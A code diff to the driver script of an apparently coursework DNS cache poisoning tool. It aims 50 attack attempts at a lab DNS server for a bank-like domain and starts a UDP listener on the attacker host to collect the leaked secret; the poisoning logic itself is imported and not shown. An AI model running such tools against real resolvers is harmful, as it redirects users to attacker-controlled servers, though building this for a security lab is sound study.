@@ -22,9 +22,12 @@ import threading
 from threading import Thread
 
 from dns_poisoning import DNSPoisoning
-from homework import DNSAttack
+from dns_attack import DNSAttack
 
-
+#Globals
+secret_fetch_flag = True        #Used to stop the secret fetcher
+verbosity = 1
+term = Terminal()
 
 
 ## Logging function
@@ -33,7 +36,6 @@ from homework import DNSAttack
 #   @param msg The message to display
 #
 def log(msg):
-    #Implement a regex to {t.*} char from the 'msg' string in case of no coloured text
     if verbosity > 0:
         print(msg.format(t=term))
         
@@ -41,7 +43,7 @@ def log(msg):
 def sigint_handler(sig, frame):
     log("Stopping secret fetcher thread...")
     secret_fetch_flag = False
-    secret_thread.join()
+    time.sleep(1)
     print("Exiting...")
     sys.exit(0)
 
@@ -49,7 +51,7 @@ def secret_fetcher(server_ip, server_port):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
     sock.bind((server_ip, server_port))
 
-    print("({t.bold}secret fetcher{t.normal}) Listening for incoming message...".format(t=term))
+    print("({t.bold}secret fetcher{t.normal}) Listening on {IP}:{port} for incoming message...".format(t=term, IP=server_ip, port=server_port))
 
     while secret_fetch_flag:
         data, addr = sock.recvfrom(1024) # buffer size is 1024 bytes
@@ -58,13 +60,8 @@ def secret_fetcher(server_ip, server_port):
 
 def main():
     
-    term = Terminal()
-    secret_fetch_flag = True
-
     print("\n{t.bold}DNS Cache Poisoning Tool{t.normal}\n".format(t=term))
 
-
-    verbosity = 1
     victim_server_ip = '192.168.56.3'
     domain = 'bankofallan.co.uk'
     #Bad Guy
@@ -72,15 +69,15 @@ def main():
     bad_udp_ip = '192.168.56.1'
 
 
-    #Lauch the secret fetcher
+    #Launch the secret fetcher
     secret_thread = Thread(target=secret_fetcher, args = (bad_udp_ip, 1337))
     secret_thread.start()
 
-    attack = DNSAttack(victim_server_ip, domain, bad_udp_ip, bad_udp_port)
+    attack = DNSAttack(victim_server_ip, domain, bad_udp_ip, bad_udp_port, \
+            blessing_terminal=term, sigint_handler=sigint_handler, log_function=log)
 
     attack.start(number_of_tries=50)
 
-    
 
 
 
